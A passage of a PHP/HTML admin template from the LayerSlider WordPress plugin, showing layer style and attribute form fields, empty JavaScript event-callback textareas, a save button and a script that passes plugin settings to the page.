															<td><input type="text" name="color" class="auto ls-colorpicker" value="" data-help="<?php _e('The color of your text. You can use color names, hexadecimal, RGB or RGBA values. Example: #333', 'LayerSlider') ?>"></td>
														</tr>
														<tr>
															<td><?php _e('Misc', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Background', 'LayerSlider') ?></td>
															<td><input type="text" name="background" class="auto ls-colorpicker" value="" data-help="<?php _e("The background color of your layer. You can use color names, hexadecimal, RGB or RGBA values as well as the 'transparent' keyword. Example: #FFF", "LayerSlider") ?>"></td>
															<td class="right"><?php _e('Rounded corners', 'LayerSlider') ?></td>
															<td><input type="text" name="border-radius" class="auto" value="" data-help="<?php _e('If you want rounded corners, you can set here its radius. Example: 5px', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Word-wrap', 'LayerSlider') ?></td>
															<td colspan="3"><input type="checkbox" name="wordwrap" class="checkbox" data-help="<?php _e('If you use custom sized layers, you have to enable this setting to wrap your text.', 'LayerSlider') ?>"></td>
														</tr>
														<tr>
															<td><?php _e('Custom style settings', 'LayerSlider') ?></td>
															<td class="right"><?php _e('Custom styles', 'LayerSlider') ?></td>
															<td colspan="7"><textarea rows="5" cols="50" name="style" class="style" data-help="<?php _e('If you want to set style settings other then above, you can use here any CSS codes. Please make sure to write valid markup.', 'LayerSlider') ?>"></textarea></td>
														</tr>
													</tbody>
												</table>
											</div>
											<div class="ls-sublayer-page ls-sublayer-attributes">
												<table>
													<tbody>
														<tr>
															<td><?php _e('Attributes', 'LayerSlider') ?></td>
															<td class="right"><?php _e('ID', 'LayerSlider') ?></td>
															<td><input type="text" name="id" value="" data-help="<?php _e('You can apply an ID attribute on the HTML element of this layer to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Classes', 'LayerSlider') ?></td>
															<td><input type="text" name="class" value="" data-help="<?php _e('You can apply classes on the HTML element of this layer to work with it in your custom CSS or Javascript code.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Title', 'LayerSlider') ?></td>
															<td><input type="text" name="title" value="" data-help="<?php _e('You can add a title to this layer which will display as a tooltip if someone holds his mouse cursor over the layer.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Alt', 'LayerSlider') ?></td>
															<td><input type="text" name="alt" value="" data-help="<?php _e('You can add an alternative text to your layer which is indexed by search engine robots and it helps people with certain disabilities.', 'LayerSlider') ?>"></td>
															<td class="right"><?php _e('Rel', 'LayerSlider') ?></td>
															<td><input type="text" name="rel" value="" data-help="<?php _e('Some plugin may use the rel attribute of a linked content, here you can specify it to make interaction with these plugins.', 'LayerSlider') ?>"></td>
														</tr>
													</tbody>
												</table>
											</div>
										</div>
									</div>
								</td>
							</tr>
						</tbody>
					</table>
					<a href="#" class="ls-add-sublayer"><?php _e('Add new layer', 'LayerSlider') ?></a>
				</div>
			</div>
		</div>

		<!-- Event Callbacks -->
		<div class="ls-page ls-callback-page">
			<div class="ls-box ls-callback-box">
				<h3 class="header">cbInit</h3>
				<div class="inner">
					<textarea name="cbinit" cols="20" rows="5">function(element) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box">
				<h3 class="header">cbStart</h3>
				<div class="inner">
					<textarea name="cbstart" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box side">
				<h3 class="header">cbStop</h3>
				<div class="inner">
					<textarea name="cbstop" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box">
				<h3 class="header">cbPause</h3>
				<div class="inner">
					<textarea name="cbpause" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box">
				<h3 class="header">cbAnimStart</h3>
				<div class="inner">
					<textarea name="cbanimstart" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box side">
				<h3 class="header">cbAnimStop</h3>
				<div class="inner">
					<textarea name="cbanimstop" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box">
				<h3 class="header">cbPrev</h3>
				<div class="inner">
					<textarea name="cbprev" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>

			<div class="ls-box ls-callback-box">
				<h3 class="header">cbNext</h3>
				<div class="inner">
					<textarea name="cbnext" cols="20" rows="5">function(data) { }</textarea>
				</div>
			</div>
			<div class="clear"></div>
		</div>
	</div>

	<div class="ls-box ls-publish">
		<h3 class="header"><?php _e('Publish', 'LayerSlider') ?></h3>
		<div class="inner">
			<button class="button-primary"><?php _e('Save changes', 'LayerSlider') ?></button>
			<p class="ls-saving-warning"></p>
			<div class="clear"></div>
		</div>
	</div>
</form>
<script type="text/javascript">

	// Plugin path
	var pluginPath = '<?php echo $GLOBALS['lsPluginPath'] ?>';

	// Transition images
	var lsTrImgPath = '<?php echo $GLOBALS['lsPluginPath'] ?>img/';

	// New Media Library
	<?php if(function_exists( 'wp_enqueue_media' )) { ?>
	var newMediaUploader = true;
	<?php } else { ?>
	var newMediaUploader = false;
	<?php } ?>

	// Screen options
	var lsScreenOptions = <?php echo json_encode($lsScreenOptions) ?>;
</script>
